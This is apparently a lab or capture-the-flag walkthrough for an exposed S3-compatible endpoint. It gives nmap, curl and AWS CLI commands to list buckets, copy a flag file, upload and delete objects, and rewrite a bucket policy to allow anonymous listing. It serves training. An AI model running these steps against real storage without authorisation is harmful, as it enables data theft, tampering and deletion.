**Objective:**Â 
Interact with the exposed S3 endpoint and perform the following tasks:
1.  Identify the S3 Endpoint.     
2.  List all the buckets owned by the current user.
3.  List all the files stored on the S3 Bucket "hello-world".      
4.  Retrieve content stored in the text file "flag" on the S3 Bucket "hello-world".      
5.  Upload a file to S3 bucket "hello-world" with the content "Hello World".
6.  Is Object listing allowed for anonymous users on the S3 Bucket "welcome"?      
7.  Modify the Bucket policy on S3 Bucket "welcome" to list the objects present in it.
8.  Delete the file "welcome" from the S3 Bucket "hello-world".

============================================================

1.- Identify the S3 Endpoint:
> Check the ip addres of the machine
> `ip addr`
> Run nmap scan on the target
> `nmap 192.222.104.3`
> ![[Pasted image 20210726150444.png]]
> Curl against ip address and port exposing an S3
> `curl 192.222.104.3:9000`
> ![[Pasted image 20210726150536.png]]
> Use xmllint to beatify the output
> `curl 192.222.104.3:9000 | xmllint --format -`
> ![[Pasted image 20210726150612.png]]

2.- List all the buckets owned by the current user:
> Configure AWS connection
> `aws configure`
> List buckets
> `aws --endpoint http://192.222.104.3:9000 s3api list-buckets`
> ![[Pasted image 20210726150956.png]]

3.- List all the files stored on the S3 Bucket "hello-world":
> `aws --endpoint http://192.222.104.3:9000 s3 ls s3://hello-world`
> ![[Pasted image 20210726151204.png]]

4.- Retrieve content stored in the text file "flag" on the S3 Bucket "hello-world":
>  `aws --endpoint http://192.222.104.3:9000 s3 cp s3://hello-world/flag ./`
>  ![[Pasted image 20210726151440.png]]

5.- Upload a file to S3 bucket "hello-world" with the content "Hello World":
>  `aws --endpoint http://192.222.104.3:9000 s3 cp hello s3://hello-world`
>  ![[Pasted image 20210726151644.png]]

6.-  Is Object listing allowed for anonymous users on the S3 Bucket "welcome"?
> Use curl to ckeck if welcome s3 bucket is accesible without authentication
> `curl http://192.222.104.3:9000/welcome/ -s | xmllint --format -`
> ![[Pasted image 20210726151910.png]]
> Ckeck bucket policy of welcome bucket
>  `aws --endpoint http://192.222.104.3:9000 s3api get-bucket-policy --bucket welcome`
>  ![[Pasted image 20210726152105.png]]

7.- Modify the Bucket policy on S3 Bucket "welcome" to list the objects present in it.
> Create a bucket policy with "aws policy generator", a web solution provided by amazon. It creates a JSON.
> ![[Pasted image 20210726152507.png]]
> Update the bucket policy
> `aws --endpoint http://192.222.104.3:9000 s3api put-bucket-policy --policy file:///root/policy.json --bucket welcome`
> Use culr to list the objects of welcome bucket
>  `curl http://192.222.104.3:9000/welcome/ -s | xmllint --format -`
> ![[Pasted image 20210726152814.png]]

8.-  Delete the file "welcome" from the S3 Bucket "hello-world".
> `aws --endpoint http://192.222.104.3:9000 s3 rm s3://hello-world/welcome`


